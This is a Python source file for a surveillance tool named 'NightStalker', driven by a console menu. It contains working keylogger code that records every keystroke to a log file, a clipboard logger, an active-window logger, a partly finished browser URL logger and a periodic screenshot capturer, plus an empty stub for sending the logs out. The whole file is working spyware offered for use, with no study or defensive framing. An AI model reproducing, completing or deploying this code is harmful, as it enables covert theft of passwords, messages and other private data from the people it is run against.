import keyboard
import pyperclip
import threading
import time
from datetime import datetime
import pygetwindow as gw
from selenium import webdriver
import pyautogui
import os

class NightStalker:
    def __init__(self):
        self.keystrokes_log = open("keystrokes.log", "a")
        self.clipboard_log = open("clipboard.log", "a")
        self.window_log = open("window.log", "a")
        self.website_log = open("website.log", "a")
        self.running_keylogger = False
        self.running_clipboard_logger = False
        self.running_window_logger = False
        self.running_website_logger = False
        self.driver = None
        self.screenshot_taker = False
        
    def log_keystrokes(self,interval=None):
        start_time = time.time()
        shift_pressed = False
        caps_lock = False
        def on_key_event(key):
            nonlocal shift_pressed, caps_lock
            if key.name in ['right shift', 'caps lock', 'right ctrl', 'left alt', 'left ctrl', 'left shift', 'right alt','backspace','ctrl']:
                if key.event_type == 'down':
                    if key.name == 'left shift' or key.name == 'right shift':
                        shift_pressed = True
                    elif key.name == 'caps lock':
                        caps_lock = not caps_lock
                    self.keystrokes_log.write(f'*{key.name}* ')
                elif key.event_type == 'up' and key.name == 'left shift' or key.name == 'right shift':
                    shift_pressed = False
            elif key.event_type == 'down':
                if (shift_pressed and not key.name.isupper()) or (caps_lock and not shift_pressed and key.name.islower()):
                    self.keystrokes_log.write(f'{key.name.upper()}')
                elif key.name == 'space':
                    self.keystrokes_log.write(' ')
                else:
                    self.keystrokes_log.write(f'{key.name}')
            self.keystrokes_log.flush()

        keyboard.hook(on_key_event)
        while self.running_keylogger:
            if interval is not None and time.time() - start_time >= interval:
                keyboard.unhook(on_key_event)
                self.stop_keylogger()
                break
            elif self.running_keylogger == False:
                keyboard.unhook(on_key_event)
                break
        pass

    def send_logs(self):
        pass
    
    def start_keylogger(self):
        self.keystrokes_log.write(f'Keylogger started at {time.ctime()}\n\n')
        self.keystrokes_log.flush()
        self.running_keylogger = True
        interval = input("Enter the interval (or 'None' for no interval): ")
        if interval == 'None':
            interval = None
        else:
            interval = int(interval)
        keylogger_thread = threading.Thread(target=self.log_keystrokes, daemon=True, args=(interval,))
        keylogger_thread.start()
        print("Keylogger started")
    
    def stop_keylogger(self):
        self.running_keylogger = False
        self.keystrokes_log.write('\n')
        self.keystrokes_log.write(f'\nKeylogger stopped at: {time.ctime()}\n\n')
        self.keystrokes_log.flush()
        print('\n'+"Keylogger stopped")

    def log_clipboard(self):
        last_clipboard_content = None
        while self.running_clipboard_logger:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                self.clipboard_log.write(f"{time.ctime()} - {current_clipboard_content}\n")
                self.clipboard_log.flush()
                last_clipboard_content = current_clipboard_content
            time.sleep(7)

    def start_clipboard_logger(self):
        self.running_clipboard_logger = True
        clipboard_logger_thread = threading.Thread(target=self.log_clipboard, daemon=True)
        clipboard_logger_thread.start()

    def stop_clipboard_logger(self):
        self.running_clipboard_logger = False

    def log_active_window(self):
        last_window_title = None
        while self.running_window_logger:
            current_window_title = gw.getActiveWindow().title
            if current_window_title != last_window_title:
                self.window_log.write(f"{time.ctime()} - {current_window_title}\n")
                self.window_log.flush()
                last_window_title = current_window_title
            time.sleep(3)

    def start_log_active_window(self):
        self.running_window_logger = True
        window_logger_thread = threading.Thread(target=self.log_active_window, daemon=True)
        window_logger_thread.start()

    def stop_log_active_window(self):
        self.running_window_logger = False
 


 #under mentenance still working on it
    def log_website_visits(self):
        last_website = None
        while self.running_website_logger:
            current_website = self.driver.current_url
            if current_website != last_website:
                self.website_log.write(f"{time.ctime()} - {current_website}\n")
                self.website_log.flush()
                last_website = current_website
            time.sleep(3)

    def start_log_website_visits(self):
        self.running_website_logger = True
        browser_choice = input("Enter the browser you want to use (Firefox, Chrome, Safari, Edge): ")
        if browser_choice.lower() == 'firefox':
            self.driver = webdriver.Firefox()
        elif browser_choice.lower() == 'chrome':
            self.driver = webdriver.Chrome()
        elif browser_choice.lower() == 'safari':
            self.driver = webdriver.Safari()
        elif browser_choice.lower() == 'edge':
            self.driver = webdriver.Edge()
        else:
            raise ValueError("Unsupported browser choice")
        website_logger_thread = threading.Thread(target=self.log_website_visits, daemon=True)
        website_logger_thread.start()
    
    def stop_log_website_visits(self):
        self.running_website_logger = False
        self.driver.quit()

#--------------------------------------


    def take_screenshot(self,takes=1,interval=0):
            while self.screenshot_taker:    
                    screenshot = pyautogui.screenshot()
                    script_dir = os.getcwd()
                    current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                    screenshot_dir = os.path.join(script_dir, 'screenshots')
                    os.makedirs(screenshot_dir, exist_ok=True)
                    screenshot.save(f'{screenshot_dir}/screenshot_{current_time}.png')
                    time.sleep(interval)
                    takes -= 1
                    if takes == 0:
                        self.stop_screenshot_taker()
                        break

    def start_screenshot_taker(self,takes,interval):
        self.screenshot_taker = True
        screenshot_thread = threading.Thread(target=self.take_screenshot, daemon=True, args=(takes,interval))
        screenshot_thread.start()

    def stop_screenshot_taker(self):
        self.screenshot_taker = False

    def __del__(self):
        self.keystrokes_log.close()
        self.clipboard_log.close()
        self.window_log.close()
        self.website_log.close()




nightStalker = NightStalker()

while True:
    try:
        choice = int(input("1 keylogger, 2 x key, 3 stat key, 4 cliplogger, 5 x cl,6 window, 7 xwindow, 8 sh, 9 xsh, 0 to exit: "))
    except ValueError:
        print("Invalid input. Please enter a number.")
        continue

    if choice == 1:
        if not nightStalker.running_keylogger:
            nightStalker.start_keylogger() 

    elif choice == 2:
        if nightStalker.running_keylogger:
            nightStalker.stop_keylogger()
            
    elif choice == 3:
        if nightStalker.running_keylogger:
            print("Keylogger is running")
        else:
            print("Keylogger is not running")

    elif choice == 4:
        if not nightStalker.running_clipboard_logger:
            nightStalker.start_clipboard_logger()
            print("Clipboard logger started")
    elif choice == 5:
        if nightStalker.running_clipboard_logger:
            nightStalker.stop_clipboard_logger()
            print("Clipboard logger stopped")

    elif choice == 6:
        if not nightStalker.running_window_logger:
            nightStalker.start_log_active_window()
            print("Window logger started")
    elif choice == 7:
        if nightStalker.running_window_logger:
            nightStalker.stop_log_active_window()
            print("Window logger stopped")
    elif choice == 8:
        takes = int(input("Enter the number of screenshots you want to take: "))
        interval = int(input("Enter the interval between screenshots: "))
        nightStalker.start_screenshot_taker(takes,interval)
    elif choice == 9:
        nightStalker.stop_screenshot_taker()

    elif choice == 0:
        if nightStalker.running_keylogger:
            nightStalker.stop_keylogger()
        elif nightStalker.running_clipboard_logger:
            nightStalker.stop_clipboard_logger()
        elif nightStalker.running_window_logger:
            nightStalker.stop_log_active_window()
        elif nightStalker.screenshot_taker:
            nightStalker.stop_screenshot_taker()
            
        print("Exiting")
        break
    else:
        print("Invalid choice. Please enter a number between 0 and 3.")